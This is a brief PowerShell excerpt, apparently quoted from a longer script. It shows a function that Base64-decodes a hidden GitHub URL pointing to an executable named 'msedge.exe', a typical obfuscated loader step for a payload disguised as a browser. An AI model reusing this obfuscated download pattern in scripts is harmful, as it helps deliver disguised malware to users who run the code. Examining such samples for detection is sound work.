...
function JA {
    try {
        ...
        $url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2trc2NhampqL2VkZ2UvcmF3L3JlZnMvaGVhZHMvbWFpbi9tc2VkZ2UuZXhl"))
